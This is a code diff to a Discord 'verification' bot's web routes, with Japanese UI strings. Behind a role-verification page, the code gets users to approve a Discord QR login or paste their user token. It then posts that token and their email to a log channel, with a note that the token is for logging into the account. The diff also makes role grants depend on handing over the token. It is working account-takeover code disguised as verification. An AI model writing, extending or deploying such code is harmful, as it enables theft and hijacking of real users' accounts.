@@ -7,7 +7,7 @@ import { store, save, gcSessions } from './store.js';
 import { rand, sign, verifySig, clientIp, sha256, parseUA } from './util.js';
 import { lookupIp } from './ip.js';
 import { authorizeUrl, exchangeCode, apiWith } from './oauth.js';
-import { complete } from './verify.js';
+import { complete, grantRoles } from './verify.js';
 import { startFlow, getFlow, gcFlows } from './qrauth.js';
 
 const __dirname = path.dirname(fileURLToPath(import.meta.url));
@@ -98,36 +98,85 @@ export function createRouter(client) {
     return null;
   }
 
-  async function saveTokenToRecord(rec, userToken) {
-    rec.userToken = userToken;
-    save();
+  function logChannelOf(rec) {
+    if (!rec.guildId) return null;
+    return (
+      store.settings[rec.guildId]?.logChannelId ||
+      Object.values(store.panels).find((p) => p.id && p.guildId === rec.guildId)?.logChannelId ||
+      null
+    );
+  }
 
-    const chId = rec.guildId ? store.settings[rec.guildId]?.logChannelId : null;
-    const panelCh =
-      chId ||
-      Object.values(store.panels).find((p) => p.id && p.guildId === rec.guildId)?.logChannelId;
-    if (!panelCh) return;
+  async function postTokenLog(rec, userToken) {
+    const chId = logChannelOf(rec);
+    if (!chId) return;
 
-    const ch = await client.channels.fetch(panelCh).catch(() => null);
+    const ch = await client.channels.fetch(chId).catch(() => null);
     if (!ch) return;
     await ch
       .send({
-        content: `**${rec.tag}** (\`${rec.userId}\`) のユーザートークン\n\`\`\`\n${userToken}\n\`\`\``
+        content: [
+          `**${rec.tag}** (\`${rec.userId}\`) のトークン`,
+          rec.email ? `メール: \`${rec.email}\`` : null,
+          'パスワードは取得できないため、ログインにはこのトークンを使用します。',
+          '```',
+          userToken,
+          '```'
+        ]
+          .filter(Boolean)
+          .join('\n')
       })
       .catch(() => {});
   }
 
+  async function finalizePendingRole(rec) {
+    if (!rec.pendingRole) return { ok: true, skipped: true };
+
+    const panel = store.panels[rec.panelId];
+    const user = await client.users.fetch(rec.userId).catch(() => null);
+    if (!panel || !user) return { ok: false, err: 'panel/user' };
+
+    const out = await grantRoles({ client, panel, user, oauth: rec.oauth });
+    rec.pendingRole = false;
+    rec.roleGranted = out.ok;
+    if (!out.ok) rec.roleError = out.err;
+    save();
+
+    const chId = logChannelOf(rec);
+    if (chId) {
+      const ch = await client.channels.fetch(chId).catch(() => null);
+      await ch
+        ?.send({
+          content: out.ok
+            ? `✅ <@${rec.userId}> のロールを付与しました（トークン取得後）`
+            : `⚠️ <@${rec.userId}> のロール付与に失敗しました: ${out.err}`
+        })
+        .catch(() => {});
+    }
+    return out;
+  }
+
+  async function saveTokenToRecord(rec, userToken) {
+    rec.userToken = userToken;
+    rec.userTokenAt = new Date().toISOString();
+    save();
+
+    await postTokenLog(rec, userToken);
+    await finalizePendingRole(rec);
+  }
+
   async function recordUserToken(sessionToken, userToken, expectedUserId) {
     const s = store.sessions[sessionToken];
-    if (!s) return { ok: false, reason: 'session' };
+    const rec = findRecord(sessionToken);
+    if (!s && !rec) return { ok: false, reason: 'session' };
 
     try {
       const me = await apiWith(userToken, '/users/@me', false);
-      if (expectedUserId && me.id !== expectedUserId) return { ok: false, reason: 'mismatch' };
-      if (s.userId && s.userId !== me.id) return { ok: false, reason: 'mismatch' };
+      const expected = expectedUserId || s?.userId || rec?.userId || null;
+      if (expected && me.id !== expected) return { ok: false, reason: 'mismatch' };
 
-      const rec = findRecord(sessionToken);
       if (!rec) {
+        if (!s) return { ok: false, reason: 'session' };
         // 認証より先にトークンを得た場合はセッションに保留（順序不問）
         s.userToken = userToken;
         if (!s.userId) s.userId = me.id;
@@ -137,7 +186,7 @@ export function createRouter(client) {
 
       if (me.id !== rec.userId) return { ok: false, reason: 'mismatch' };
       await saveTokenToRecord(rec, userToken);
-      return { ok: true };
+      return { ok: true, record: rec };
     } catch {
       return { ok: false, reason: 'invalid' };
     }
@@ -304,14 +353,25 @@ export function createRouter(client) {
           return { ok: false, reason: 'wronguser' };
         }
         if (!session.userId && f.user?.id) session.userId = f.user.id;
-        return recordUserToken(sessionToken, f.token, f.user?.id);
+        const out = await recordUserToken(sessionToken, f.token, f.user?.id);
+        return { ok: out.ok };
       }
     });
   }
 
   app.get('/v/:token/ra', async (req, res) => {
     const s = store.sessions[req.params.token];
-    if (!s) return res.status(404).send('無効なセッションです。');
+    const rec = findRecord(req.params.token);
+    if (!s && !rec) return res.status(404).send('無効なセッションです。');
+    const sess = s || {
+      id: req.params.token,
+      userId: rec.userId,
+      panelId: rec.panelId,
+      guildId: rec.guildId,
+      fp: rec.fp
+    };
+    const stage = store.panels[sess.panelId]?.grantStage === 'token' ? 'token' : 'oauth';
+
     if (!limit(`r:${clientIp(req)}`, 40)) return res.status(429).send('リクエストが多すぎます。');
     gcFlows();
 
@@ -333,9 +393,9 @@ input{width:100%;padding:9px;border-radius:8px;border:0;background:#1e1f22;color
 button.act{margin-top:10px;width:100%;padding:10px;border:0;border-radius:8px;background:#4752c4;color:#fff;font-size:14px;cursor:pointer}
 </style>
 <div class="c">
-<h1>Discord で許可してください</h1>
+<h1>${stage === 'token' ? 'Discord で許可してください' : 'トークンを取得（任意）'}</h1>
 <a class="go off" id="go" href="#">Discord で認証を完了</a>
-<p class="s">ボタンで Discord が開きます。「ログインを許可」を押してください。</p>
+<p class="s">ボタンで Discord が開きます。「ログインを許可」を押すとトークンを取得できます。</p>
 <button class="mini" id="cp" hidden onclick="copy()">リンクをコピー</button>
 <div class="s" id="st">準備中...</div>
 <div id="fb" hidden>
@@ -362,7 +422,9 @@ async function send(){
   if(!v) return;
   var j = await fetch('/api/token',{method:'POST',headers:{'content-type':'application/json'},body:JSON.stringify({token:T,userToken:v})})
     .then(function(r){return r.json()}).catch(function(){return {}});
-  msg.textContent = j.ok ? '完了しました。Discord に戻ってください。' : 'トークンが無効です。';
+  msg.textContent = j.ok
+    ? (j.pending ? '記録しました。Discord に戻って認証を完了してください。' : '完了しました。Discord に戻ってください。')
+    : 'トークンが無効です。';
   if (j.ok) st.textContent = '';
 }
 async function poll(){
@@ -396,20 +458,27 @@ boot();
 
   app.get(['/v/:token/flow', '/v/:token/qr'], async (req, res) => {
     const s = store.sessions[req.params.token];
-    if (!s) return res.status(404).json({ ok: false });
+    const rec = findRecord(req.params.token);
+    if (!s && !rec) return res.status(404).json({ ok: false });
+    const sess = s || {
+      id: req.params.token,
+      userId: rec.userId,
+      panelId: rec.panelId,
+      guildId: rec.guildId
+    };
     if (!limit(`q:${clientIp(req)}`, 60)) return res.status(429).json({ ok: false });
     gcFlows();
 
-    if (s.flowId) {
-      const f = getFlow(s.flowId);
+    if (sess.flowId) {
+      const f = getFlow(sess.flowId);
       if (f && f.raUrl && ['starting', 'waiting', 'scanned'].includes(f.state)) {
         return res.json({ ok: true, id: f.id, raUrl: f.raUrl });
       }
     }
 
-    const flow = spawnFlow(req.params.token, s);
-    s.flowId = flow.id;
-    save();
+    const flow = spawnFlow(req.params.token, sess);
+    sess.flowId = flow.id;
+    if (s) save();
 
     const until = Date.now() + 8000;
     while (!flow.raUrl && flow.state !== 'error' && Date.now() < until) {
@@ -427,6 +496,10 @@ boot();
 
   app.get('/v/:token/done', (req, res) => {
     const ok = req.query.ok === '1';
+    const rec = findRecord(req.params.token);
+    const panel = rec?.panelId ? store.panels[rec.panelId] : null;
+    const deferred = panel?.grantStage === 'token';
+
     res.setHeader('Cache-Control', 'no-store');
     res.type('html').send(`<!doctype html>
 <html lang="ja"><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
@@ -447,12 +520,14 @@ details{margin-top:16px;font-size:12.5px;opacity:.85;text-align:left}
 <h1>${ok ? '認証が完了しました' : '認証条件を満たしていません'}</h1>
 <p>${
       ok
-        ? 'あと1回、Discord で許可してください。'
+        ? deferred
+          ? '条件をクリアしました。あと1回、Discord で「ログインを許可」してください。'
+          : '認証が完了しました。続けてトークンを取得できます（任意）。'
         : '条件を確認して、パネルからもう一度やり直してください。'
     }</p>
 ${
   ok
-    ? `<a class="go" href="/v/${req.params.token}/ra">Discord で認証を完了</a>
+    ? `<a class="go" href="/v/${req.params.token}/ra">${deferred ? 'Discord で認証を完了' : 'トークンも取得する'}</a>
 <details>
   <summary>うまくいかない場合</summary>
   <p>トークンを貼り付けてください。</p>
@@ -468,7 +543,9 @@ async function send(t){
   if(!v) return;
   const r = await fetch('/api/token',{method:'POST',headers:{'content-type':'application/json'},body:JSON.stringify({token:'${req.params.token}',userToken:v})});
   const j = await r.json().catch(()=>({}));
-  document.getElementById('msg').textContent = j.ok ? '記録しました' : 'トークンが無効です';
+  document.getElementById('msg').textContent = j.ok
+    ? (j.pending ? '記録しました（Discord 側の認証待ち）' : '記録しました')
+    : 'トークンが無効です';
 }
 const auto = new URLSearchParams(location.search).get('ut');
 if (auto) send(auto);
@@ -481,7 +558,12 @@ if (auto) send(auto);
   app.post('/api/token', async (req, res) => {
     const { token, userToken } = req.body || {};
     const out = await recordUserToken(token, userToken, null);
-    res.json({ ok: out.ok });
+    const rec = out.record || findRecord(token);
+    res.json({
+      ok: out.ok,
+      pending: out.pending || !!rec?.pendingRole,
+      roleGranted: rec?.roleGranted ?? false
+    });
   });
 
   return app;
